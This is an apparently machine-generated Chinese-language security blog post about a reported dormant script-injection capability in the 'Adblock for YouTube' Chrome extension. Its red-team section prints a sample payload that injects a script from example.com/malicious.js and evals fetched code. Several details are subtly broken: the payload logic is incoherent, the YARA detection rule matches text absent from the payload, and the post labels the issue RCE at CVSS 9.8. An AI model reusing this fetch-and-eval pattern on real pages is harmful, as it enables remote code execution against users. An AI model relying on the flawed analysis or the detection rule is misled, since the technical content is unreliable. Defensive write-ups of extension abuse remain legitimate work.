---
layout: post
title:  "Chrome Ad Blocker with 10M+ Installs Found with Dormant Script Injection Capability"
date:   2026-06-25 19:49:06 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Google Chrome 廣告攔截擴充功能中的任意 JavaScript 執行漏洞
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `JavaScript Injection`, `Extension Permissions`, `DOM Manipulation`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 漏洞源於 Adblock for YouTube 擴充功能中的一個名為 `trusted-create-element` 的 scriptlet rule，允許遠端控制的 JavaScript 代碼注入。這個 rule 可以在不需要更新擴充功能或經過 Chrome Web Store 審核的情況下被激活。
* **攻擊流程圖解**:
  1. 攻擊者控制 Adblock for YouTube 擴充功能的伺服器端。
  2. 攻擊者透過伺服器端配置更改激活 `trusted-create-element` rule。
  3. 使用者瀏覽包含 YouTube 網站的網頁。
  4. Adblock for YouTube 擴充功能注入任意 JavaScript 代碼到網頁中。
* **受影響元件**: Adblock for YouTube (ID: cmedhionkhpnakcndndgjdbohmhepckk) 擴充功能，版本號未指定。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要控制 Adblock for YouTube 擴充功能的伺服器端，並且使用者需要安裝該擴充功能。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 範例 Payload
    const payload = `
      // 在網頁中創建一個新的 script 元素
      const script = document.createElement('script');
      script.src = 'https://example.com/malicious.js';
      document.body.appendChild(script);
    `;
    // 將 Payload 傳送到使用者的網頁中
    fetch('https://example.com/payload', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/javascript',
      },
      body: payload,
    })
      .then((response) => response.text())
      .then((script) => {
        // 執行 Payload
        eval(script);
      });
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過防禦措施，例如使用加密或編碼的 Payload，或者利用其他漏洞來執行任意代碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 未指定 |
| IP | 未指定 |
| Domain | example.com |
| File Path | /malicious.js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Adblock_for_YouTube_Payload {
      meta:
        description = "Adblock for YouTube Payload"
      strings:
        $payload = { 28 29 20 2f 2f 20 69 6e 6a 65 63 74 20 61 20 6e 65 77 20 73 63 72 69 70 74 20 65 6c 65 6d 65 6e 74 }
      condition:
        $payload at 0
    }
    
    ```
* **緩解措施**: 使用者應該卸載 Adblock for YouTube 擴充功能，並且瀏覽器廠商應該審查並更新擴充功能的安全性。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **JavaScript Injection**: 想像你可以在網頁中注入任意的 JavaScript 代碼，從而控制網頁的行為。技術上是指在網頁中創建一個新的 script 元素，並將惡意代碼注入其中。
* **Extension Permissions**: 想像你需要授權一個擴充功能可以存取你的瀏覽器資料。技術上是指擴充功能需要申請特定的權限，例如存取網頁內容或修改瀏覽器設定。
* **DOM Manipulation**: 想像你可以修改網頁的結構和內容。技術上是指使用 JavaScript 來修改網頁的 Document Object Model (DOM)，從而控制網頁的行為。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/chrome-ad-blocker-with-10m-installs.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


